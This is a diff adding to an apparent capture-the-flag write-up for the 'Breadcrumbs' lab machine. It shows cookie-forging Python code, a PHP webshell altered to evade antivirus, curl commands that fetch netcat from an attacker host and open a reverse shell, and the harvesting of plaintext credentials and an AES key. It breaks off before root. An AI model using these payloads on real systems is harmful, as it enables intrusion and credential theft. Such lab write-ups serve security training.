@@ -394,9 +394,300 @@ function makesession($username){
 
 - Let's write a script to find a valid sookie
 ```
+import hashlib
+import requests
+
+
+users = ["alex", "paul", "jack", "olivia", "john", "emma", "william", "lucas", "sirine", "juliette", "support"]
+
+for user in users:
+	for ch in user:
+		hash = hashlib.md5(f"s4lTy_stR1nG_{ch}(!528./9890".encode('utf-8')).hexdigest()
+		cookie = f"{user}{hash}"	
+		r = requests.get('http://10.10.10.228/portal/index.php', cookies={"PHPSESSID": cookie})
+		if user in r.text.lower():
+			print(f"Found => {user}: {cookie}")
 
 ```
-## User
 
+- We have hits
+```
+└─$ python3 cookie_check.py
+Found => paul: paul47200b180ccd6835d25d034eeb6e6390
+Found => olivia: oliviaaa0aa8b0e94759562a5854d69b9e6b79
+Found => john: john5815c66675415230039fb4616cd0dce8
+```
+
+- I'll use `paul`'s cookie, since he's an admin
+
+![](./images/22.png)
+
+- If we try to upload, we will still have `insufficient privileges` error
+  - We need to forge `jwt` token
+  - We know the `secret`
+  - Let's use [jwt.io](https://jwt.io/)
+  - The payload is based on source code we got above
+
+![](./images/23.png)
+
+- Now we can upload files
+  - I tried uploading a simple webshell, but received an error
+
+![](./images/24.png)
+
+- `Burp` shows that the web page is trying appending `.zip` to task name
+
+![](./images/25.png)
+
+- I changed the `Test.zip` to `shell.php`
+  - But now we got different error
+  - 
+
+![](./images/26.png)
+
+- I was stuck here for a while
+  - I saw some hints on forum, it looks like windows defender is flagging my `php` file as malicious
+  - Let's change it a bit
+    - `<?php $result=shell_exec($_REQUEST['cmd']); echo "<pre>$result</pre>"; ?>`
+
+![](./images/27.png)
+
+![](./images/28.png)
+
+- Let's get reverse shell
+```
+└─$ curl http://10.10.10.228/portal/uploads/shell.php --data-urlencode "cmd=powershell -c wget 10.10.16.8/nc64.exe -outfile C:\programdata\nc.exe"
+<pre></pre>                                                                                                                                    
+```
+```
+└─$ curl http://10.10.10.228/portal/uploads/shell.php --data-urlencode "cmd=\programdata\nc.exe 10.10.16.8 6666 -e cmd"
+```
+
+![](./images/29.png)
+
+## User
+- Enumerate
+  - Inside `C:\Users\www-data\Desktop\xampp\htdocs\portal` we have `pizzaDeliveryUserData` folder
+  - It looks like it's related to disabled button in `portal` endpoint
+  - We found creds in `juliette.json` file
+```
+C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>type juliette.json
+type juliette.json
+{
+        "pizza" : "margherita",
+        "size" : "large",
+        "drink" : "water",
+        "card" : "VISA",
+        "PIN" : "9890",
+        "alternate" : {
+                "username" : "juliette",
+                "password" : "jUli901./())!",
+        }
+}
+```
+
+- Let's try `ssh`
+  - `juliette:jUli901./())!`
+```
+└─$ ssh juliette@10.10.10.228
+The authenticity of host '10.10.10.228 (10.10.10.228)' can't be established.
+ED25519 key fingerprint is SHA256:aQcQrF+10YxX8CBQ26nT/5luebgQc123pC6ciqCe4J0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.228' (ED25519) to the list of known hosts.
+juliette@10.10.10.228's password: 
+
+Microsoft Windows [Version 10.0.19041.746]
+(c) 2020 Microsoft Corporation. All rights reserved.
+                                                    
+juliette@BREADCRUMBS C:\Users\juliette>  
+```
 
 ## Root
+- We have a note on `juliette`'s desktop
+```
+juliette@BREADCRUMBS C:\Users\juliette>dir desktop
+ Volume in drive C has no label.                  
+ Volume Serial Number is 7C07-CD3A                
+                                                  
+ Directory of C:\Users\juliette\desktop           
+                                                  
+01/15/2021  05:04 PM    <DIR>          .          
+01/15/2021  05:04 PM    <DIR>          ..         
+12/09/2020  07:27 AM               753 todo.html  
+09/21/2023  10:10 AM                34 user.txt   
+               2 File(s)            787 bytes     
+               2 Dir(s)   5,491,372,032 bytes free
+                                                  
+juliette@BREADCRUMBS C:\Users\juliette>type desktop\todo.html
+<html>                  
+<style>                 
+html{                   
+background:black;       
+color:orange;           
+}                       
+table,th,td{            
+border:1px solid orange;
+padding:1em;
+border-collapse:collapse;
+}
+</style>
+<table>
+        <tr>
+            <th>Task</th>
+            <th>Status</th>
+            <th>Reason</th>
+        </tr>
+        <tr>
+            <td>Configure firewall for port 22 and 445</td>
+            <td>Not started</td>
+            <td>Unauthorized access might be possible</td>
+        </tr>
+        <tr>
+            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
+            <td>In progress</td>
+            <td>It stores passwords in plain text</td>
+        </tr>
+        <tr>
+            <td>Add new features to password manager</td>
+            <td>Not started</td>
+            <td>To get promoted, hopefully lol</td>
+        </tr>
+</table>
+
+</html>
+```
+
+- We can google info about `Sticky Notes`
+  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#sticky-notes
+
+```
+juliette@BREADCRUMBS C:\>dir c:\users\juliette\Appdata\local\packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
+ Volume in drive C has no label.
+ Volume Serial Number is 7C07-CD3A
+
+ Directory of c:\users\juliette\Appdata\local\packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
+
+01/15/2021  05:10 PM    <DIR>          .
+01/15/2021  05:10 PM    <DIR>          ..
+01/15/2021  05:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
+11/29/2020  04:10 AM             4,096 plum.sqlite
+01/15/2021  05:10 PM            32,768 plum.sqlite-shm
+01/15/2021  05:10 PM           329,632 plum.sqlite-wal
+               4 File(s)        386,976 bytes
+               2 Dir(s)   5,491,294,208 bytes free
+```
+
+- I downloaded files
+  - Host `smbserver`
+    - `impacket-smbserver share $(pwd) -smb2support`
+```
+PS C:\users\juliette\Appdata\local\packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> copy plum.* \\10.10.16.8\share\
+```
+```
+└─$ ls
+plum.sqlite  plum.sqlite-shm  plum.sqlite-wal
+```
+
+- Let's open them using `sqlite3`
+```
+└─$ sqlite3 plum.sqlite
+SQLite version 3.42.0 2023-05-16 12:36:15
+Enter ".help" for usage hints.
+sqlite> .tables
+Media           Stroke          SyncState       User          
+Note            StrokeMetadata  UpgradedNote  
+sqlite> select * from Note;
+\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
+\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
+\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122
+```
+
+- We have creds for `development`
+  - We saw `Development` folder in `C:\` that we couldn't access
+  - I am pretty sure `development` user has access to it
+```
+PS C:\> icacls c:\development
+c:\development NT AUTHORITY\SYSTEM:(OI)(CI)(RX)
+               BUILTIN\Administrators:(OI)(CI)(RX)
+               BREADCRUMBS\development:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+```
+└─$ smbmap -H 10.10.10.228 -u development -p 'fN3)sN5Ee@g'
+[+] IP: 10.10.10.228:445        Name: 10.10.10.228                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        Anouncements                                            READ ONLY
+        C$                                                      NO ACCESS       Default share
+        Development                                             READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+```
+
+- Let's check it
+```
+└─$ smbclient  //10.10.10.228/development -U 'development%fN3)sN5Ee@g'  
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat Jan 16 00:03:49 2021
+  ..                                  D        0  Sat Jan 16 00:03:49 2021
+  Krypter_Linux                       A    18312  Sun Nov 29 11:11:56 2020
+
+                5082961 blocks of size 4096. 1340573 blocks available
+smb: \> get Krypter_Linux 
+getting file \Krypter_Linux of size 18312 as Krypter_Linux (22.9 KiloBytes/sec) (average 22.9 KiloBytes/sec)
+```
+
+- `Krypter_Linux`
+```
+└─$ file Krypter_Linux          
+Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped
+```
+```
+└─$ ./Krypter_Linux       
+Krypter V1.2
+
+New project by Juliette.
+New features added weekly!
+What to expect next update:
+        - Windows version with GUI support
+        - Get password from cloud and AUTOMATICALLY decrypt!
+***
+
+No key supplied.
+USAGE:
+
+Krypter <key>
+```
+- I'll open the file in `Ghidra`
+
+![](./images/30.png)
+
+- We can see that there is `curl` request to `http://passmanager.htb:1234/index.php`
+  - Let's reconnect with `ssh` and set port forwarding with `-L 1234:127.0.01:1234` 
+```
+└─$ curl 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords'
+selectarray(1) {
+  [0]=>
+  array(1) {
+    ["aes_key"]=>
+    string(16) "k19D193j.<19391("
+  }
+}
+```
+
+- Or
+```
+juliette@BREADCRUMBS C:\Users\juliette>curl "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords"      
+selectarray(1) {                 
+  [0]=>                          
+  array(1) {                     
+    ["aes_key"]=>                
+    string(16) "k19D193j.<19391("
+  }                              
+}                                
+```
+
+- We have a key, but we also need an encrypted password
